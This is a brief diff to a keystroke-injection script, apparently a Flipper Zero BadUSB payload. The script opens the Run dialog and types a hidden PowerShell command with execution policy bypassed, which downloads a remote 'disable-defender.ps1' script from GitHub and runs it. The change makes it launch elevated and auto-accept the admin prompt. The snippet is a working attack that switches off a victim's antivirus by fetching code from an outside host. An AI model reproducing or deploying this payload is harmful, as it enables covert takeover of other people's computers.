@@ -20,7 +20,7 @@ DELAY 1000
 GUI r
 DELAY 750
 STRING powershell -NoP -Ep Bypass -W H -C irm https://github.com/knoxoxen/flipperstuffs/raw/main/disable-defender.ps1 | iex
-ENTER
+CTRL-SHIFT ENTER
 DELAY 3000
 ALY y
 
